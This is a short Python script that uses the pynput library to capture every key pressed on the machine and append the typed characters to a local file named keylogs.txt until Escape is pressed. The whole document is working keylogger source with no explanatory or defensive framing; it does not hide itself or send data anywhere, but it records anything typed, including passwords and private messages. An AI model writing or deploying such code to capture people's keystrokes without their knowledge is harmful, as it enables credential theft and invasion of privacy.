from pynput.keyboard import Key, Listener

log_file = 'keylogs.txt'
keys = []

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)

def write_file(keys):
    with open(log_file, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == 'Key.space':
                f.write(" ")
            elif k.find("Key") == -1:  # Ignoring special keys except space
                f.write(k)
        keys.clear()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
